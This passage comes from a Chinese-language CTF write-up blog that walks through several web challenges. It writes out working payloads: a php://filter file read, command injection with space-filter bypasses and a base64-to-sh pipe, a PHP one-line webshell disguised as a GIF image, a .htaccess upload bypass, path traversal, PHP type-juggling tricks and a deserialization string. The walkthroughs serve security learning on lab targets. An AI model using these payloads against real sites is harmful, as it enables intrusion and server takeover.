-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281625622.png" alt="image-20220728162456844"></p>
-<p>便出现了一串长长长长长长的字符，再利用CyberChef解码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281625219.png" alt="image-20220728162540153"></p>
-<p>这不就来了？</p>
-
-        <h1 id="七、-GXYCTF2019-Ping-Ping-Ping-1"   >
-          <a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="七、[GXYCTF2019]Ping Ping Ping 1"></a>七、[GXYCTF2019]Ping Ping Ping 1</h1>
-      <p>打开后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281627904.png"></p>
-<p>显然，由题名可得又是命令执行</p>
-<p>打开一下当前目录</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;ls</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281627727.png" alt="image-20220728162755671"></p>
-<p>尝试打开flag文件</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat flag</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281628024.png" alt="image-20220728162829966"></p>
-<p>space表明网站对空格进行了过滤，应该想办法绕过空格，方法有：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS  //此题不行</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></div></figure>
-
-<p>于是我们尝试输入</p>
-<p><code>/?ip=;cat$IFS$1flag.php</code></p>
-<p>然鹅</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281629238.png" alt="image-20220728162923192"></p>
-<p>flag也被过滤了</p>
-
-        <h3 id="法Ⅰ：用其他变量把flag拼接"   >
-          <a href="#法Ⅰ：用其他变量把flag拼接" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：用其他变量把flag拼接" class="headerlink" title="法Ⅰ：用其他变量把flag拼接"></a>法Ⅰ：用其他变量把flag拼接</h3>
-      <p>即：用某一变量代替flag中的某一部分</p>
-<p>输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;b=g;cat$IFS$1fla$b.php  //$b即g</span><br></pre></td></tr></table></div></figure>
-
-<p>回车后查看网页源代码</p>
-<p>!<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281631585.png" alt="image-20220728163134531"></p>
-
-        <h3 id="法Ⅱ：对cat-flag-php进行base64加密"   >
-          <a href="#法Ⅱ：对cat-flag-php进行base64加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：对cat-flag-php进行base64加密" class="headerlink" title="法Ⅱ：对cat flag.php进行base64加密"></a>法Ⅱ：对cat flag.php进行base64加密</h3>
-      <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141529604.png" alt="image-20220114152923516"></p>
-<p>由于过滤掉了bash，就用sh</p>
-<p>即输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></div></figure>
-
-<p>回车后查看网页源代码</p>
-<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141532132.png" alt="image-20220114153215098"></p>
-
-        <h3 id="法Ⅲ：内联执行"   >
-          <a href="#法Ⅲ：内联执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：内联执行" class="headerlink" title="法Ⅲ：内联执行"></a>法Ⅲ：内联执行</h3>
-      <p>反引号内的命令优先执行</p>
-<p>举个栗子：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ a=flag;</span><br><span class="line">cat `echo $a` //即cat flag</span><br></pre></td></tr></table></div></figure>
-
-<p>输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat$IFS$1`ls`   //因为flag本就在当前根目录下，所以反引号内为ls</span><br></pre></td></tr></table></div></figure>
-
-<p>回车后查看网页源代码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281637876.png" alt="image-20220728163746817"></p>
-<p>都有了</p>
-
-        <h1 id="八、-极客大挑战-2019-Knife-1"   >
-          <a href="#八、-极客大挑战-2019-Knife-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-极客大挑战-2019-Knife-1" class="headerlink" title="八、[极客大挑战 2019]Knife 1"></a>八、[极客大挑战 2019]Knife 1</h1>
-      <p>打开后就是</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281638623.png" alt="image-20220728163823560"></p>
-<p>本身的题目名加上打开界面的“菜刀”，已经在明示了使用菜刀，蚁剑也可</p>
-<p>界面已经提示密码是Syc了</p>
-<p>打开蚁剑，添加数据</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312020462.png" alt="image-20220731202004334"></p>
-<p>添加完毕后选择“文件管理”</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312020456.png" alt="image-20220731202040332"></p>
-<p>在文件中可以看见有flag文件</p>
-<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201151650024.png" alt="image-20220115164959958"></p>
-<p>点击后发现flag就在文件内</p>
-<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201151650572.png" alt="image-20220115165027520"></p>
-<p>成功！</p>
-
-        <h1 id="九、-极客大挑战-2019-Http-1"   >
-          <a href="#九、-极客大挑战-2019-Http-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-极客大挑战-2019-Http-1" class="headerlink" title="九、[极客大挑战 2019]Http 1"></a>九、[极客大挑战 2019]Http 1</h1>
-      <p>打开后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312052122.png" alt="image-20220731205236040"></p>
-<p>查看网页源代码后发现有个Secret.php</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312053672.png" alt="image-20220731205323610"></p>
-<p>访问一下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312054384.png" alt="image-20220731205406216"></p>
-<p>看来是要从图上的网站访问才行</p>
-
-        <h3 id="法Ⅰ：利用插件HackBar"   >
-          <a href="#法Ⅰ：利用插件HackBar" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：利用插件HackBar" class="headerlink" title="法Ⅰ：利用插件HackBar"></a>法Ⅰ：利用插件HackBar</h3>
-      <p>F12点击这个后选择HackBar</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312055825.png" alt="image-20220731205506778"></p>
-<p>添加Header</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312118505.png" alt="image-20220731211802447"></p>
-<p>（URL就是当前网址）</p>
-<p>再点击EXECUTE</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312118635.png" alt="image-20220731211859524"></p>
-<p>看来，还得改一下User-Agent</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312120997.png" alt="image-20220731212058923"></p>
-<p>点击EXECUTE</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312121339.png" alt="image-20220731212129226"></p>
-<p>要求还蛮多，那就再改一改X-Forwarded-For</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312122412.png" alt="image-20220731212206349"></p>
-<p>点击EXECUTE</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312122684.png" alt="image-20220731212217561"></p>
-<p>出来了</p>
-
-        <h3 id="法Ⅱ：利用Burp-Suite"   >
-          <a href="#法Ⅱ：利用Burp-Suite" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用Burp-Suite" class="headerlink" title="法Ⅱ：利用Burp Suite"></a>法Ⅱ：利用Burp Suite</h3>
-      <p>先是抓包，然后鼠标右键选择</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312125764.png" alt="image-20220731212517663"></p>
-<p>再和法Ⅰ步骤类似，修改Referer和User-Agent，并添加X-Forwarded-For</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221624.png" alt="image-20220731222135588"></p>
-<p>“GO”！</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221855.png" alt="image-20220731222150813"></p>
-<p>GO成功！</p>
-
-        <h1 id="十、-极客大挑战-2019-Upload-1"   >
-          <a href="#十、-极客大挑战-2019-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-极客大挑战-2019-Upload-1" class="headerlink" title="十、[极客大挑战 2019]Upload 1"></a>十、[极客大挑战 2019]Upload 1</h1>
-      <p>打开后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457650.png" alt="image-20230917144537665"></p>
-<p>提示我们上传图片文件，用记事本写一个一句话木马并将格式改为jpg</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457252.png" alt="image-20230917144725558"></p>
-<p>上传后提示我们</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457851.png" alt="image-20230917144756129"></p>
-<p>那就只能在记事本里改为：</p>
-<p><code>GIF89a</code></p>
-<p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[shell]);&lt;/script&gt;</code></p>
-<p>重新上传后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457999.png" alt="image-20230917145159795"></p>
-<p>说明我们成功绕过检测，抓包一下，更改文件后缀名为.phtml</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171500511.png" alt="image-20230917150048441"></p>
-<p>然后我们可以试着用蚁剑连接一下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171505712.png" alt="image-20230917150525660"></p>
-<p>可以看到连接成功</p>
-<p>添加数据右键进入文件管理找flag（一般flag文件在根目录）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506797.png" alt="image-20230917150631727"></p>
-<p>点击flag即可拿到flag</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506518.png" alt="image-20230917150646459"></p>
-
-        <h1 id="十一、-ACTF2020-新生赛-Upload-1"   >
-          <a href="#十一、-ACTF2020-新生赛-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-ACTF2020-新生赛-Upload-1" class="headerlink" title="十一、[ACTF2020 新生赛]Upload 1"></a>十一、[ACTF2020 新生赛]Upload 1</h1>
-      <p>打开后鼠标移到灯泡那里会有上传提示</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171515429.png" alt="image-20230917151504289"></p>
-<p>选择上一题的test.jpg进行上传，然后抓包</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171517549.png" alt="image-20230917151747480"></p>
-<p>可以看到上传成功，文件后缀改成phtml再试试，也是成功</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171524639.png" alt="image-20230917152447561"></p>
-<p>尝试一下用蚁剑连接</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171530781.png" alt="image-20230917153003714">也是连接成功，同[极客大挑战 2019]Upload 1找到flag</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171531922.png" alt="image-20230917153102858"></p>
-
-        <h1 id="十二、-GXYCTF2019-BabyUpload-1"   >
-          <a href="#十二、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十二、[GXYCTF2019]BabyUpload 1"></a>十二、[GXYCTF2019]BabyUpload 1</h1>
-      <p>依然是上传题</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201511645.png" alt="image-20230920151158606"></p>
-<p>试着上传test.jpg</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201512570.png" alt="image-20230920151233540"></p>
-<p>上传成功，我们抓包改一下文件后缀为phtml</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201514612.png" alt="image-20230920151451582"></p>
-<p>看来不太行</p>
-<p>但是这道题打开环境之前有个网站提示点进去查看exp.py文件</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201516206.png" alt="image-20230920151656161"></p>
-<p>上网查了一下发现是要先配置文件，得先上传.htaccess文件，并且内容为</p>
-<p><code>SetHandler application/x-httpd-php</code></p>
-<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20230920151948753.png" alt="image-20230920151948753"></p>
-<p>没上传成功，抓包改一下“Content-Type”为image/jpeg</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521467.png" alt="image-20230920152129426"></p>
-<p>发现上传成功</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521478.png" alt="image-20230920152157429"></p>
-<p>再将test.jpg上传</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525594.png" alt="image-20230920152514565"></p>
-<p>发现上传成功（在URL中去掉/var/www/html）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525182.png" alt="image-20230920152551144"></p>
-<p>再到蚁剑连接</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527023.png" alt="image-20230920152721974"></p>
-<p>连接成功！</p>
-<p>添加数据后查看flag文件</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527736.png" alt="image-20230920152756697"></p>
-<p>OVER！</p>
-
-        <h1 id="十三、-MRCTF2020-你传你🐎呢-1"   >
-          <a href="#十三、-MRCTF2020-你传你🐎呢-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、-MRCTF2020-你传你🐎呢-1" class="headerlink" title="十三、[MRCTF2020]你传你🐎呢 1"></a>十三、[MRCTF2020]你传你🐎呢 1</h1>
-      <p>同 十二、[GXYCTF2019]BabyUpload 1</p>
-
-        <h1 id="十四、-HCTF-2018-WarmUp-1"   >
-          <a href="#十四、-HCTF-2018-WarmUp-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、-HCTF-2018-WarmUp-1" class="headerlink" title="十四、[HCTF 2018]WarmUp 1"></a>十四、[HCTF 2018]WarmUp 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112268.png" alt="image-20240102111212097"></p>
-<p>查看网页源代码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112270.png" alt="image-20240102111240218"></p>
-<p>提示查看/source.php</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021113080.png" alt="image-20240102111323993"></p>
-<p>通过阅读代码可知</p>
-<p><code>highlight_file</code>函数显示当前文件的源代码，<code>__FILE__</code>是一个特殊的常量，表示当前文件的完整路径和文件名</p>
-<p>在emmm类中定义了一个公共的静态函数<code>checkFile</code>，它接受一个引用参数<code>$page</code></p>
-<p><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code> 这行定义了一个名为<code>$whitelist</code>的数组，包含两个键值对，用于存储允许包含的文件名</p>
-<p>最后一个if语句判断检查HTTP请求中是否包含名为<code>file</code>的参数，且这个参数是否为字符串，并通过<code>checkFile</code>函数检查是否在白名单中</p>
-<p>先访问新的页面hint</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021120122.png" alt="image-20240102112052078"></p>
-<p>获取到了flag的文件名，以及每个字母重复四次在提示我们是在四层目录之下</p>
-<p>构造payload，包含名为file的参数</p>
-<p><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021124961.png" alt="image-20240102112429922"></p>
-<p>得到flag</p>
-
-        <h1 id="十五、-极客大挑战-2019-BuyFlag-1"   >
-          <a href="#十五、-极客大挑战-2019-BuyFlag-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-极客大挑战-2019-BuyFlag-1" class="headerlink" title="十五、[极客大挑战 2019]BuyFlag 1"></a>十五、[极客大挑战 2019]BuyFlag 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636859.png" alt="image-20240102163601647"></p>
-<p>查看右上角菜单可以看到有一个payflag，点进去之后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636196.png" alt="image-20240102163658086"></p>
-<p>可以看到要想获得flag必须满足三个条件，①学生②正确的password③要有100000000的money</p>
-<p>查看网页源代码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021638992.png" alt="image-20240102163827958"></p>
-<p>提示表明要使用POST方法，password的值为404，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，但是又只使用了“==”，说明只是弱类型比较，添加随机字母才能使得参数等于数字</p>
-<p>所以先使用HackBar进行POST方法给password和money传参</p>
-<p><code>password=404a&amp;money=100000000</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021645883.png" alt="image-20240102164540845"></p>
-<p>EXECUTE后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647276.png" alt="image-20240102164732243"></p>
-<p>就差第一个条件了，再抓包</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647760.png"></p>
-<p>看到Cookie那儿user（用户）的值为0，在计算机语言中，0通常为假，1通常为真，将user修改为1后发送</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021649126.png" alt="image-20240102164937096"></p>
-<p>又告诉我们数字长度太长了</p>
-
-        <h3 id="法Ⅰ：科学计数法"   >
-          <a href="#法Ⅰ：科学计数法" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：科学计数法" class="headerlink" title="法Ⅰ：科学计数法"></a>法Ⅰ：科学计数法</h3>
-      <p>使用科学计数法表示就能缩短长度了，100000000改为1e9（表示1后面有9个零，8个零会回显钱不够）</p>
-<p>发送之后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021655354.png" alt="image-20240102165532310"></p>
-<p>得到flag</p>
-
-        <h3 id="法Ⅱ：数组绕过"   >
-          <a href="#法Ⅱ：数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：数组绕过" class="headerlink" title="法Ⅱ：数组绕过"></a>法Ⅱ：数组绕过</h3>
-      <p>上网查查到这个方法，将<code>money=100000000</code>改为<code>money[]=0</code> (0可以为任何小于100000000的数字)</p>
-
-        <h1 id="十六、-BJDCTF2020-Easy-MD5-1"   >
-          <a href="#十六、-BJDCTF2020-Easy-MD5-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-BJDCTF2020-Easy-MD5-1" class="headerlink" title="十六、[BJDCTF2020]Easy MD5 1"></a>十六、[BJDCTF2020]Easy MD5 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021715170.png"></p>
-<p>有点不知道怎么做，查看网页源代码也没啥发现，在题目打开界面有一个github链接，点击查看Web目录下的和url同名的文件leveldo4.php</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021717742.png" alt="image-20240102171756699"></p>
-<p>阅读代码，通过GET方法传入参数password的值为ffifdyop，则会跳转到新界面</p>
-<p>（也可以直接访问/levels91.php）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719956.png" alt="image-20240102171930880"></p>
-<p>查看网页源代码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719570.png" alt="image-20240102171959537"></p>
-<p>阅读代码后可知，通过GET方法传入a和b，a和b值不同，但md5值相同</p>
-<p>（此处类似于[SWPUCTF 2021 新生赛]easy_md5）</p>
-<p>于是我们可以采用数组绕过（值都为NULL）或是科学计数法绕过</p>
-<p>构造payload</p>
-<p><code>/levels91.php?a[]=1&amp;b[]=2</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021722138.png" alt="image-20240102172204101"></p>
-<p>和刚刚的类似，两个参数值不同，但md5值相同，但是使用的是POST方法，得利用HackBar</p>
-<p>这里是用的强类型比较，即两个参数值和类型都得相同，再次使用数组绕过</p>
-<p>输入</p>
-<p><code>param1[]=0&amp;param2[]=1</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021728962.png" alt="image-20240102172834916"></p>
-<p>EXECUTE后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021738817.png" alt="image-20240102173809772"></p>
-<p>得到flag</p>
-
-        <h1 id="十七、-MRCTF2020-Ez-bypass-1"   >
-          <a href="#十七、-MRCTF2020-Ez-bypass-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-MRCTF2020-Ez-bypass-1" class="headerlink" title="十七、[MRCTF2020]Ez_bypass 1"></a>十七、[MRCTF2020]Ez_bypass 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031656440.png" alt="image-20240103165642369"></p>
-<p>先通过GET方法传入id和gg，值不同但md5值要相同</p>
-<p>接着再用POST方法传入passwd，passwd值要为1234567，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，那直接在后面随便加个字母</p>
-<p>先传入id和gg</p>
-<p><code>/?id[]=1&amp;gg[]=2</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031659394.png" alt="image-20240103165958346"></p>
-<p>表明第一步完成，接着传入passwd，借助HackBar</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031700323.png" alt="image-20240103170040267"></p>
-<p>EXECUTE后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031701777.png" alt="image-20240103170102724"></p>
-<p>得到flag</p>
-
-        <h1 id="十八、-网鼎杯-2020-青龙组-AreUSerialz-1"   >
-          <a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十八、-网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="十八、[网鼎杯 2020 青龙组]AreUSerialz 1"></a>十八、[网鼎杯 2020 青龙组]AreUSerialz 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718311.png" alt="image-20240104171810248"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718517.png" alt="image-20240104171824476"></p>
-<p>阅读代码可知，满足条件op=2，执行read读的操作；满足content&lt;100即可绕过；最后用GET方式传参str，而且最后的代码也提示了使用php反序列化</p>
-<p>根据op=2和filename=flag.php写出反序列化代码</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op = 2;</span><br><span class="line">    public $filename = &quot;flag.php&quot;;</span><br><span class="line">    public $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new FileHandler());</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>
-
-<p>（此处将三个变量的类型换成了public类型，否则序列化后会产生星号*）运行后得到序列化</p>
-<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code> </p>
-<p>构造payload</p>
-<p><code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
-<p>回车查看网页源代码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041930727.png" alt="image-20240104193053674"></p>
-<p>得到flag</p>
-
